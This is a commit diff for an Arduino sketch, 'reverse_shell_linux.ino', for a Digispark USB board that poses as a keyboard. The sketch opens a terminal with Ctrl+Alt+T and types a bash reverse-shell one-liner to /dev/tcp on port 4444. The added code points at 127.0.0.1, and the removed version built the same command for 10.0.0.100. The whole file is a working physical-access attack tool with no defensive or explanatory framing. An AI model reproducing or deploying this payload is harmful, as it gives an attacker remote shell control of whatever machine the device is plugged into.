cd5b431565030fd6f84cd3c487acdaba41c5f015
5e1c1567 <gummykittens19@gmail.com>
2026-04-29 18:32:41 +0000

    Fix all of reverse_shell_linux.ino

--- reverse_shell_linux.ino
+++ reverse_shell_linux.ino
@@ -1,30 +1,21 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+
+  DigiKeyboard.sendKeyStroke(0);
+
+  DigiKeyboard.delay(1000);
+
+  // Press Ctrl + Alt + T to open a terminal
+  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
+
+  DigiKeyboard.delay(5000); // Adjust this to your need, mine takes a long time
+
+  DigiKeyboard.print(F("bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"));
+  DigiKeyboard.delay(600);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
 
-  #include "DigiKeyboard.h"
+}
 
-  String IPPORT = F("10.0.0.100/4444");
-
-  String BASH_COMMAND;
-
-  void setup() {
-
-    BASH_COMMAND = R"bash -i >& /dev/tcp/" + IPPORT + " 0>&1";
-
-    DigiKeyboard.delay(1000);
-
-    DigiKeyboard.sendKeyStroke(0);
-    // Press Ctrl + Alt + T to open a terminal
-    DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
-
-    DigiKeyboard.delay(600);
-
-    DigiKeyboard.sendKeyStroke(BASH_COMMAND);
-    DigiKeyboard.delay(600);
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
-
-
-  }
-
-  void loop() {}
-
-
+void loop() {}
